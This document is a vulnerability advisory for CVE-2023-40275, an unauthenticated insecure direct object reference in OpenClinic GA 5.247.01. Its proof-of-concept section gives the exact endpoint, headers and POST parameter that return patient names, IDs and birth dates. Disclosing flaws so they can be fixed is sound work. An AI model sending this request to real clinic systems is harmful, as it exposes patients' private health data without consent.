# CVE-2023-40275: Insecure Direct Object References Leading to Unauthenticated Patient List Access in OpenClinic GA
## Abstract
A critical Insecure Direct Object Reference (IDOR) vulnerability has been identified in OpenClinic GA, version 5.247.01, allowing unauthenticated users to enumerate patients. The vulnerability is due to inadequate implementation of access control checks within the patientslistShow.jsp component, thereby allowing unauthorized individuals to execute specific POST requests for sensitive patient data retrieval.

## Identification
CVE ID: CVE-2023-40275

Exploit Title: Unauthenticated Patient List Retrieval via IDOR in OpenClinic GA 5.247.01

Date Discovered: 14-08-2023

Affected Software: OpenClinic GA version 5.247.01

Vendor: OpenClinic

Software Link: [SourceForge Project Page](https://sourceforge.net/projects/open-clinic/)

Tested Environments: Windows 10, Windows 11

## Vulnerability Details
The identified vulnerability exploits inadequate access controls within OpenClinic GA's web application, specifically targeting the patientslistShow.jsp component. By crafting and submitting specific POST requests, unauthorized attackers can bypass authentication mechanisms to access and enumerate sensitive patient information. This vulnerability exposes patient details to potential unauthorized access, thereby breaching the confidentiality and integrity of personal health information.

## Proof of Concept (PoC)
  Steps to Reproduce:

    1. Preparing the POST Request:
      Use an HTTP client capable of sending POST requests (e.g., curl, Postman, or a custom script).
      Target URL: http://[IP]:10088/openclinic/_common/search/searchByAjax/patientslistShow.jsp, replacing [IP] with the actual IP address or domain of the OpenClinic GA installation.

    2. Crafting the Request Body:
      Include headers in the request as follows:
        Accept: text/javascript, text/html, application/xml, text/xml, /
        X-Prototype-Version: 1.7.3
        X-Requested-With: XMLHttpRequest
        User-Agent: [Your User Agent]
        Content-type: application/x-www-form-urlencoded; charset=UTF-8
        Origin: http://[IP]:10088
        Accept-Encoding: gzip, deflate
        Accept-Language: en-US,en;q=0.9
        Connection: close
        
      In the request body, include the parameter findFirstname=[any name].
    
    3. Sending the Request and Observing the Outcome:
      Upon sending the POST request, the server responds with a list of patients matching the findFirstname parameter, all without requiring authentication.

    4. Confirming the Vulnerability:
      This method exposes the internal ID and date of birth of patients, confirming an Incorrect Access Control vulnerability. The capacity to retrieve patient lists without authentication poses a significant risk, enabling unauthorized access to sensitive patient information.

## Impact
The exploitation of this vulnerability can lead to unauthorized access to sensitive patient information, including names, internal IDs, and dates of birth. This breach of privacy could have severe implications for affected individuals.
